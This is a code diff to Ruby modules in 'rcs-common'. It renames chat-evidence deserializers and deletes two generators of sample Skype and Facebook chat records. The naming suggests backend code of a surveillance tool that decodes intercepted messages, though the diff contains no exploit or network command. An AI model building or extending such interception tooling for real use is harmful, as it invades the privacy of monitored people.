@@ -7,7 +7,7 @@ require 'rcs-common/evidence/common'
 
 module RCS
 
-module ChatnewEvidence
+module ChatEvidence
   include RCS::Tracer
 
   ELEM_DELIMITER = 0xABADC0DE
@@ -92,7 +92,7 @@ module ChatnewEvidence
       #trace :debug, "CHAT content: #{info[:data][:content]}"
 
       delim = stream.read(4).unpack("L").first
-      raise EvidenceDeserializeError.new("Malformed CHATNEW (missing delimiter)") unless delim == ELEM_DELIMITER
+      raise EvidenceDeserializeError.new("Malformed CHAT (missing delimiter)") unless delim == ELEM_DELIMITER
 
       yield info if block_given?
     end
@@ -101,7 +101,7 @@ module ChatnewEvidence
 end # ChatEvidence
 
 
-module ChatEvidence
+module ChatoldEvidence
   include RCS::Tracer
 
   ELEM_DELIMITER = 0xABADC0DE
@@ -162,7 +162,7 @@ module ChatEvidence
       end
       
       delim = stream.read(4).unpack("L*").first
-      raise EvidenceDeserializeError.new("Malformed CHAT (missing delimiter)") unless delim == ELEM_DELIMITER
+      raise EvidenceDeserializeError.new("Malformed CHAT OLD (missing delimiter)") unless delim == ELEM_DELIMITER
 
       #puts "decode_content #{info}"
 
@@ -170,46 +170,7 @@ module ChatEvidence
     end
     :delete_raw
   end
-end # ChatEvidence
+end # ChatoldEvidence
 
-module ChatskypeEvidence
-  include ChatEvidence
-
-  def content
-    program = "SKYPE\0".to_utf16le_binary
-    topic = "Chatting...\0".to_utf16le_binary
-    users = "ALoR, Daniel\0".to_utf16le_binary
-    content = StringIO.new
-    t = Time.now.getutc
-    content.write [t.sec, t.min, t.hour, t.mday, t.mon, t.year, t.wday, t.yday, t.isdst ? 0 : 1].pack('l*')
-    content.write program
-    content.write topic
-    content.write users
-    content.write "chat da skype...\0".to_utf16le_binary
-    content.write [ ELEM_DELIMITER ].pack('L')
-
-    content.string
-  end
-end # ChatskypeEvidence
-
-module SocialEvidence
-  include ChatEvidence
-
-  def content
-    program = "Facebook\0".to_utf16le_binary
-    topic = "\0".to_utf16le_binary
-    users = "ALoR Daniel\0".to_utf16le_binary
-    content = StringIO.new
-    t = Time.now.getutc
-    content.write [t.sec, t.min, t.hour, t.mday, t.mon, t.year, t.wday, t.yday, t.isdst ? 0 : 1].pack('l*')
-    content.write program
-    content.write topic
-    content.write users
-    content.write "messaggio su facebook\0".to_utf16le_binary
-    content.write [ ELEM_DELIMITER ].pack('L')
-
-    content.string
-  end
-end # SocialEvidence
 
 end # ::RCS
